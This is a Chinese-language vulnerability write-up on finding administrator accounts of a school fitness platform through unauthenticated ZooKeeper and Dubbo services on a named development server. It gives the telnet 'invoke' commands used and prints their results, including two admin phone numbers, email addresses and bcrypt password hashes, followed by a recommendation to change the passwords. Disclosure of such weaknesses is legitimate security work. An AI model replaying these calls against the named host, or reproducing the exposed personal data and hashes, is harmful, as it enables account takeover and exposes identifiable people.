# 管理员手机号发现过程记录

## ⚠️ 重要声明

本记录中的手机号**均来自开发环境数据库**（开发机 `123.56.207.13` 的 Dubbo 服务），**生产数据库未直接验证**，不代表生产环境当前的管理员手机号。仅供技术团队参考定位账号。

---

## 结论

通过开发机 Dubbo 无鉴权调用，发现平台存在**两套系统**，各有独立的 admin 账号：

| 系统 | admin 用户名 | admin 手机号 | 说明 |
| :--- | :--- | :--- | :--- |
| **studentfit**（老系统） | admin | **17611162991**（邮箱 admin@163.com） | **学校"三精准"实际使用**（sjz 后台/小程序调用此系统） |
| **nationfit**（新系统） | admin | **18601133548**（邮箱 18601133548@qq.com） | 大健康/戒毒所/泰康等机构版 |

---

## 发现过程

### 第一步：确认管理后台并找到开发机入口

- 通过浏览器搜索"京师世范 三精准"发现管理后台 `sjz.jstzsjz.cn`（体质健康"三精准"服务平台）
- 分析该后台前端 JS 时，发现其大量业务接口（如 `/report/queryUserSchoolInfos`、`/studentnew/list/info` 等）
- 在开发机 `123.56.207.13` 上发现 **ZooKeeper（2181 端口）完全无鉴权**，读取到完整微服务拓扑，确认开发机运行着三精准的 SOA 后端服务（soa-provider-user 等）

### 第二步：发现 Dubbo 服务无鉴权

- 开发机开放 **Dubbo RPC 端口（20880-20885）**，`nmap` 识别为 "Alibaba Dubbo remoting"
- 通过 telnet 直接连接（无需任何认证），执行 `ls` / `invoke` 命令可用
- 确认开发机 Dubbo 服务与 sjz 管理后台接口**方法完全对应**（如 `StatisticsOverviewService.queryUserSchoolInfos` 与 sjz 前端 `/report/queryUserSchoolInfos`），说明 sjz 后台底层调用这些服务

### 第三步：调用 UserService 查询管理员

通过 Dubbo 无鉴权调用用户服务，查询两套系统的系统管理员：

```
invoke cn.soa.nationfit.service.UserService.findUserByUserName("admin")
```

返回（nationfit 新系统）：

```json
{
  "id": 1,
  "username": "admin",
  "phone": "18601133548",
  "email": "18601133548@qq.com",
  "realName": "管理员",
  "roleIds": "1",
  "roleNames": "系统管理员",
  "password": "$2a$10$5i6GATnz9w2vb2LceaIYb.DTeaBQ/pl4.F93/8GF7QueYx/9aroR2"
}
```

```
invoke cn.studentfit.soa.service.UserService.findUserByUserName("admin")
```

返回（studentfit 老系统）：

```json
{
  "id": 1,
  "username": "admin",
  "phone": "17611162991",
  "email": "admin@163.com",
  "realName": "管理员",
  "password": "$2a$10$zkvyz.adHYYcM/skRBoykuTLmVJfKA8tg1yuQ1aQEovg.cE5heeTS"
}
```

### 第四步：交叉验证

- 通过 `UserPermissionService.findUserHaveRoles(1)` 确认 admin 角色为 **系统管理员（type=1）**，拥有 `/api/system/**` 全部权限
- 通过 `SchoolService.findAll()` 读取全部学校，所有学校的 `currUser` 均为 admin
- **架构确认**：sjz 后台前端调用的是 **studentfit 系统的独有接口**（如 `downLoadClockResult`），且小程序数据对应 studentfit 学校（如组织 11464），故 **学校"三精准"实际使用 studentfit 老系统**

---

## 为什么这个手机号重要

1. **系统管理员账号**（id=1）是平台的最高权限账号
2. 手机号（两套系统）是登录后台的凭据之一
3. 其 **bcrypt 密码哈希**已暴露，若密码强度不足或泄露，账号可被直接登录

**建议**：请尽快排查并修改 admin 账号密码，妥善处理已暴露的手机号相关登录风险。

---

## 相关漏洞

- 详见《漏洞汇总报告.md》漏洞 2（开发机 Dubbo 服务无鉴权）与漏洞 8（生产环境 Dubbo 无鉴权）
- 手机号通过**只读调用**获取，未对系统做任何修改
